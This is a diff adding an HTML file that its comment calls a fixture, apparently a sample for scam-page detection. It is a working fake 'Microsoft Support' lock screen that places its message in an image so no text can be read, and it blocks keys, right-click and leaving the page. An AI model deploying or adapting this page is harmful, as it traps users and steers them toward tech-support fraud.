@@ -1,0 +1,58 @@
+<!doctype html>
+<!--
+  Fixture, not a real attack: a lock screen whose whole message is a picture, so there is no
+  text to read. It still blocks keys, right-click and unload. Fictional 555 number.
+-->
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Loading...</title>
+  </head>
+  <body>
+    <script>
+      const picture =
+        'data:image/svg+xml,' +
+        encodeURIComponent(
+          `<svg xmlns="http://www.w3.org/2000/svg" width="640" height="300" font-family="Arial" fill="white" text-anchor="middle">
+            <text x="320" y="80" font-size="28" font-weight="bold">Your computer has been locked</text>
+            <text x="320" y="140" font-size="18">Call Microsoft Support immediately</text>
+            <text x="320" y="210" font-size="34" font-weight="bold" fill="#ffdd00">1-800-555-0144</text>
+          </svg>`,
+        );
+
+      const lockScreenHtml = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <meta charset="utf-8" />
+          <title>Notice</title>
+          <style>
+            html, body { height: 100%; margin: 0; }
+            body { background: #002bff; display: flex; align-items: center; justify-content: center; }
+            img { max-width: 90%; }
+          </style>
+        </head>
+        <body>
+          <img src="${picture}" alt="" />
+          <script>
+            document.addEventListener('contextmenu', (e) => e.preventDefault());
+            document.addEventListener('keydown', (e) => {
+              const blocked = ['F5', 'F11', 'F12', 'Escape'];
+              if (blocked.includes(e.key) || (e.ctrlKey && ['r', 'w', 'l'].includes(e.key.toLowerCase()))) {
+                e.preventDefault();
+              }
+            });
+            window.addEventListener('beforeunload', (e) => {
+              e.preventDefault();
+              e.returnValue = '';
+            });
+          <\/script>
+        </body>
+        </html>
+      `;
+
+      const blob = new Blob([lockScreenHtml], { type: 'text/html' });
+      window.location.href = URL.createObjectURL(blob);
+    </script>
+  </body>
+</html>
